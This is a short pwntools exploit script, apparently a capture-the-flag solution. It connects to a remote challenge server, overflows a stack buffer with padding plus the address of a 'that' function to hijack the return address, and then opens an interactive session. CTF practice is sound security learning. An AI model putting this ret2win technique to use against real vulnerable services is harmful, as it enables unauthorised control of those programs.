from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28265)
elf = ELF('./pwn')
that = elf.sym['that']
io.recvuntil("How long are you?")
io.sendline(str(25))
io.recvuntil("Who are you?")
payload = 'a'*(0xE+8) + p64(that)
io.sendline(payload)
io.interactive()
